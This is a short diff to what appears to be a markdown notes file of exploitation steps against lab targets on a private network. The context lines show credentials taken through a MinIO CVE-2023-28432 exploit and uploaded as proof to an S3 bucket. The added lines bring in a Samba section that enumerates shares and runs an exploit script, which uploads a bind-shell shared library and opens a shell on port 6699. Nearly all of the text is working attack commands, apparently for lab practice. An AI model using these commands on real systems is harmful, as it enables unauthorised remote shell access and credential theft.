@@ -102,3 +102,16 @@ echo "Stolen credentials: minioadmin:minioadmin-vulhub" >> cve_exploit_proof.txt
 aws --endpoint-url http://172.20.0.103:9000 s3 cp cve_exploit_proof.txt s3://cve-2023-28432-pwned/
 aws --endpoint-url http://172.20.0.103:9000 s3 ls s3://cve-2023-28432-pwned/
 ```
+
+### 4. Samba
+```bash
+smbclient -L //172.20.0.104/ -N
+cd /opt
+./exploit.py -t 172.20.0.104 \
+  -e libbindshell-samba.so \
+  -s myshare \
+  -r /home/share/libbindshell-samba.so \
+  -u guest -p guest \
+  -P 6699
+
+```
